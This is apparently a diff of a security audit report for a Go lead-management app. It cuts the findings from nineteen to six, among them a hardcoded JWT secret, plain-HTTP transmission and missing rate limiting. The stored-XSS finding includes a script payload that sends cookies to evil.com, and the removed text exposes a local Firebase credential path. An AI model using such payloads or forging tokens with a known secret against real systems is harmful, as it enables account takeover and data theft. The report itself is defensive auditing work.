@@ -10,24 +10,6 @@ VULNERABILITY #1
 --------------------------------------------------------------------------------
 CWE-798 (Use of Hard-Coded Credentials)
 Severity: Critical
-File: cmd/server/main.go, Line 17
-Description: A hardcoded filesystem path to a Firebase service account key file
-is embedded directly in the source code as a fallback default:
-  credPath = `C:\Users\tonil\Desktop\tcc\lead-manager-54595-firebase-adminsdk-fbsvc-375221693a.json`
-This path reveals the Firebase project name ("lead-manager-54595") and the
-service account key identifier ("375221693a"). If this code is committed to a
-repository (public or shared), attackers gain knowledge of the exact credential
-file location and the Firebase project identity, facilitating targeted attacks.
-Exploitation: An attacker who gains read access to the source code (e.g., via a
-public repository) learns the exact Firebase project and credential file path.
-Combined with any file-read vulnerability or access to the developer machine,
-the full service account key could be exfiltrated, granting full Firestore
-database access.
-
-VULNERABILITY #2
---------------------------------------------------------------------------------
-CWE-798 (Use of Hard-Coded Credentials)
-Severity: Critical
 File: internal/auth/jwt.go, Lines 17-21
 Description: The JWT signing secret has a hardcoded fallback value:
   secret = "lead-manager-jwt-secret-change-in-production"
@@ -37,6 +19,19 @@ attacker who reads the source code can forge valid JWT tokens for any user.
 Exploitation: An attacker crafts a JWT with an arbitrary user_id and email,
 signs it with the known default secret, and gains full authenticated access to
 any user's leads. This enables complete account takeover of all users.
+
+VULNERABILITY #2
+--------------------------------------------------------------------------------
+CWE-319 (Cleartext Transmission of Sensitive Information)
+Severity: High
+File: cmd/server/main.go, Line 61
+Description: The server uses http.ListenAndServe (plain HTTP) with no TLS
+configuration. All data, including authentication credentials, JWT tokens, and
+lead data (PII such as emails, phone numbers, company names) are transmitted in
+cleartext.
+Exploitation: An attacker performing a man-in-the-middle attack (e.g., on public
+WiFi or a compromised network) can intercept login credentials, JWT tokens, and
+all lead data. Captured JWT tokens allow full session hijacking.
 
 VULNERABILITY #3
 --------------------------------------------------------------------------------
@@ -50,23 +45,10 @@ any malicious website can make API calls on behalf of a logged-in user if the
 token is accessible via JavaScript.
 Exploitation: An attacker hosts a malicious webpage that makes AJAX requests to
 the Lead Manager API. If a user visits the page while having their JWT token
-stored in localStorage (common for SPAs), the attacker's JavaScript can read the
-token and make authenticated API requests to steal or modify the user's leads.
+stored in localStorage, the attacker's JavaScript can read the token and make
+authenticated API requests to steal or modify the user's leads.
 
 VULNERABILITY #4
---------------------------------------------------------------------------------
-CWE-319 (Cleartext Transmission of Sensitive Information)
-Severity: High
-File: cmd/server/main.go, Line 61
-Description: The server uses http.ListenAndServe (plain HTTP) with no TLS
-configuration. All data, including authentication credentials (passwords in
-login/signup requests), JWT tokens, and lead data (PII such as emails, phone
-numbers, company names) are transmitted in cleartext.
-Exploitation: An attacker performing a man-in-the-middle attack (e.g., on public
-WiFi or a compromised network) can intercept login credentials, JWT tokens, and
-all lead data. Captured JWT tokens allow full session hijacking.
-
-VULNERABILITY #5
 --------------------------------------------------------------------------------
 CWE-598 (Use of GET Request Method with Sensitive Query Strings)
 Severity: High
@@ -78,7 +60,7 @@ Exploitation: An attacker can harvest JWT tokens from server access logs, proxy
 logs, browser history, or Referer headers sent to third-party resources linked
 from export result pages. Each captured token grants full authenticated access.
 
-VULNERABILITY #6
+VULNERABILITY #5
 --------------------------------------------------------------------------------
 CWE-307 (Improper Restriction of Excessive Authentication Attempts)
 Severity: High
@@ -91,226 +73,39 @@ against user accounts by sending rapid, repeated login requests. The weak
 minimum password length (6 characters) makes brute-force attacks even more
 feasible.
 
-VULNERABILITY #7
---------------------------------------------------------------------------------
-CWE-521 (Weak Password Requirements)
-Severity: Medium
-File: internal/handlers/auth.go, Lines 39-42
-Description: The only password requirement is a minimum length of 6 characters.
-There are no requirements for complexity (uppercase, lowercase, digits, special
-characters). Additionally, the password is trimmed of whitespace on line 33,
-which reduces the effective keyspace and could silently alter a user's intended
-password.
-Exploitation: Users can set trivially weak passwords like "123456" or "aaaaaa",
-making brute-force and dictionary attacks significantly easier.
-
-VULNERABILITY #8
---------------------------------------------------------------------------------
-CWE-352 (Cross-Site Request Forgery)
-Severity: Medium
-File: cmd/server/main.go (entire routing), internal/middleware/auth.go
-Description: The application has no CSRF protection. While it uses JWT Bearer
-tokens (which provide some CSRF resistance since they must be explicitly
-attached), the tokenOrBearerAuth function on lines 140-146 of main.go accepts
-tokens via query parameters, which can be embedded in links. State-changing
-operations (DELETE, PUT, POST) on lead resources have no CSRF token validation.
-Exploitation: An attacker could craft a malicious link with a stolen or known
-token in the query string that triggers a state-changing export operation. If
-tokens are stored in cookies in any future iteration, all state-changing
-endpoints become vulnerable to CSRF.
-
-VULNERABILITY #9
---------------------------------------------------------------------------------
-CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
-Severity: Medium
-File: internal/handlers/auth.go, Line 125
-Description: The line `doc.Data()["password"].(string)` performs an unguarded
-type assertion on the password field from Firestore. If the "password" field is
-missing or not a string, this causes a panic (runtime crash), which in a
-production setting can lead to denial of service and potentially expose stack
-traces with sensitive internal information.
-Exploitation: An attacker could trigger this by manipulating the database (if
-they have any write access) to set the password field to a non-string type, or
-this could occur due to data migration issues, causing the server to crash and
-potentially expose internal details in error responses.
-
-VULNERABILITY #10
---------------------------------------------------------------------------------
-CWE-20 (Improper Input Validation)
-Severity: Medium
-File: internal/handlers/leads.go, Lines 38-40 and Lines 260-283
-Description: When creating or updating leads, the Status and Source fields are
-not validated against the valid values defined in models/lead.go (ValidStatuses
-and ValidSources). Any arbitrary string can be set as the status or source of a
-lead. On create, only FullName and Email are checked for non-emptiness. On
-update, no validation is performed at all on the new values.
-Exploitation: An attacker can inject arbitrary status and source values into
-leads, potentially causing inconsistent data, breaking frontend displays, or
-injecting malicious payloads stored in the database (stored XSS if any frontend
-renders these values without escaping).
-
-VULNERABILITY #11
---------------------------------------------------------------------------------
-CWE-20 (Improper Input Validation)
-Severity: Medium
-File: internal/csvutil/csvutil.go, Lines 44-118 and Lines 163-225
-Description: During CSV and Excel import, the status field is set from the file
-without validation against ValidStatuses (line 96-99 for CSV, line 207-209 for
-Excel). The source field is also not validated. No email format validation is
-performed on imported leads. An attacker can upload a file with arbitrary values
-for all fields.
-Exploitation: An attacker uploads a crafted CSV/Excel file with malicious
-payloads in the status, source, notes, or other fields. These payloads are
-stored in Firestore and could be rendered by the frontend without proper
-escaping, enabling stored XSS attacks.
-
-VULNERABILITY #12
+VULNERABILITY #6
 --------------------------------------------------------------------------------
 CWE-79 (Cross-Site Scripting - Stored XSS)
 Severity: Medium
 File: internal/handlers/leads.go, Lines 25-60 (Create), Lines 225-296 (Update),
       internal/handlers/import_export.go, Lines 62-132 (Import)
 Description: User-supplied data for lead fields (FullName, Email, Phone,
-Company, Position, Source, Status, Notes) and interaction fields (Type, Notes)
-is stored in Firestore without any sanitization or output encoding. If the
-frontend templates render these values without proper escaping, stored XSS
-attacks are possible. The server-side API returns raw JSON with unescaped user
-input.
+Company, Position, Source, Status, Notes) and interaction fields is stored in
+Firestore without any sanitization or output encoding. If the frontend renders
+these values without proper escaping, stored XSS attacks are possible.
 Exploitation: An attacker creates or updates a lead with JavaScript in the
 FullName or Notes field (e.g., "<script>document.location='http://evil.com/
 steal?c='+document.cookie</script>"). When another user views this lead in the
 frontend, the malicious script executes in their browser context.
 
-VULNERABILITY #13
---------------------------------------------------------------------------------
-CWE-770 (Allocation of Resources Without Limits or Throttling)
-Severity: Medium
-File: internal/handlers/leads.go, Lines 62-190 (GetAll)
-Description: The GetAll handler fetches ALL leads matching the user's ID from
-Firestore into memory before applying filtering, sorting, and pagination. For a
-user with a very large number of leads, this loads the entire dataset into
-server memory on every request.
-Exploitation: An attacker creates a large number of leads (via the API or
-import) and then repeatedly calls the GetAll endpoint, causing excessive memory
-consumption and potentially crashing the server (denial of service).
-
-VULNERABILITY #14
---------------------------------------------------------------------------------
-CWE-770 (Allocation of Resources Without Limits or Throttling)
-Severity: Medium
-File: internal/handlers/import_export.go, Lines 62-132 (Import)
-Description: While the multipart form is limited to 10MB (line 65), there is no
-limit on the number of leads that can be imported from a single file. An
-attacker can upload a 10MB CSV file containing hundreds of thousands of rows,
-all of which will be individually inserted into Firestore in a tight loop with
-no batching or throttling.
-Exploitation: An attacker uploads a CSV with 100,000+ rows, causing the server
-to make 100,000+ individual Firestore write operations, consuming significant
-server resources, Firestore write quotas, and potentially costing significant
-money on the Firebase billing.
-
-VULNERABILITY #15
---------------------------------------------------------------------------------
-CWE-209 (Generation of Error Message Containing Sensitive Information)
-Severity: Low
-File: internal/handlers/import_export.go, Lines 94-96
-Description: The import error message includes the raw error from the CSV/Excel
-parsing library: fmt.Sprintf("failed to parse file: %v", err). This could
-expose internal implementation details, library names, and file system paths.
-Exploitation: An attacker uploads a malformed file to trigger detailed error
-messages that reveal information about the server's internal stack, library
-versions, and potentially file paths, aiding further attacks.
-
-VULNERABILITY #16
---------------------------------------------------------------------------------
-CWE-613 (Insufficient Session Expiration)
-Severity: Low
-File: internal/auth/jwt.go, Lines 29-30
-Description: JWT tokens have a 24-hour expiration and there is no token
-revocation mechanism. Once issued, a token remains valid for 24 hours regardless
-of password changes, account deletion, or detected compromise. There is no
-refresh token rotation or session invalidation capability.
-Exploitation: If a JWT token is stolen (via logs, network interception, or XSS),
-the attacker has a full 24-hour window of access. Even if the user changes their
-password, the stolen token remains valid until expiration.
-
-VULNERABILITY #17
---------------------------------------------------------------------------------
-CWE-862 (Missing Authorization)
-Severity: Low
-File: cmd/server/main.go, Lines 38-39
-Description: The signup and login endpoints (/api/auth/signup, /api/auth/login)
-have no rate limiting or abuse prevention. The signup endpoint allows unlimited
-account creation with no CAPTCHA or verification, potentially allowing an
-attacker to create a massive number of accounts.
-Exploitation: An attacker scripts mass account creation, polluting the user
-database, consuming Firestore storage, and potentially using the accounts for
-further abuse of the system.
-
-VULNERABILITY #18
---------------------------------------------------------------------------------
-CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag)
-Severity: Low
-File: internal/handlers/auth.go, Lines 85, 137
-Description: The authentication token is returned in the JSON response body.
-While this is standard for APIs, the application serves HTML templates directly
-(lines 30-35 in main.go), indicating a hybrid SPA approach. There is no
-guidance or mechanism for secure token storage. If the frontend stores the JWT
-in localStorage (common practice), it becomes accessible to any XSS attack.
-Exploitation: Any successful XSS attack (see Vulnerability #12) can exfiltrate
-the JWT token from localStorage, granting the attacker full account access.
-
-VULNERABILITY #19
---------------------------------------------------------------------------------
-CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
-Severity: Low
-File: cmd/server/main.go, Line 30
-Description: The static file server uses a relative path "web/static" with
-http.FileServer. While http.StripPrefix and http.Dir provide basic protection,
-the use of relative paths means the served directory depends on the working
-directory at runtime, which could potentially serve unintended files if the
-application is started from an unexpected directory.
-Exploitation: If the application is started from a different working directory
-than expected, the static file server could serve files from an unintended
-location. This is a defense-in-depth concern rather than a directly exploitable
-vulnerability.
-
 ================================================================================
 SUMMARY
 ================================================================================
-Total vulnerabilities found: 19
+Total vulnerabilities found: 6
 
 By Severity:
-  Critical: 2
+  Critical: 1
   High:     4
-  Medium:   7
-  Low:      6
+  Medium:   1
 
 Critical Issues Requiring Immediate Action:
-1. Remove hardcoded Firebase credential path from source code (Vuln #1)
-2. Remove hardcoded JWT secret fallback; require JWT_SECRET env var (Vuln #2)
+1. Remove hardcoded JWT secret fallback; require JWT_SECRET env var (Vuln #1)
 
 High Priority Recommendations:
+2. Enable TLS/HTTPS (Vuln #2)
 3. Restrict CORS to specific allowed origins (Vuln #3)
-4. Enable TLS/HTTPS (Vuln #4)
-5. Remove JWT token acceptance via query parameters (Vuln #5)
-6. Implement rate limiting on authentication endpoints (Vuln #6)
-
-Medium Priority Recommendations:
-7. Enforce stronger password policies (Vuln #7)
-8. Implement CSRF protection (Vuln #8)
-9. Add safe type assertion for password field (Vuln #9)
-10. Validate Status and Source fields against allowed values (Vuln #10, #11)
-11. Sanitize user input before storage or implement output encoding (Vuln #12)
-12. Implement server-side pagination at the database query level (Vuln #13)
-13. Add limits on import row count and use batch writes (Vuln #14)
-
-Low Priority Recommendations:
-14. Sanitize error messages before returning to clients (Vuln #15)
-15. Implement token revocation / refresh token rotation (Vuln #16)
-16. Add rate limiting and CAPTCHA to signup (Vuln #17)
-17. Provide secure token storage guidance; consider HttpOnly cookies (Vuln #18)
-18. Use absolute paths for static file serving (Vuln #19)
+4. Remove JWT token acceptance via query parameters (Vuln #4)
+5. Implement rate limiting on authentication endpoints (Vuln #5)
 
 ================================================================================
 END OF REPORT
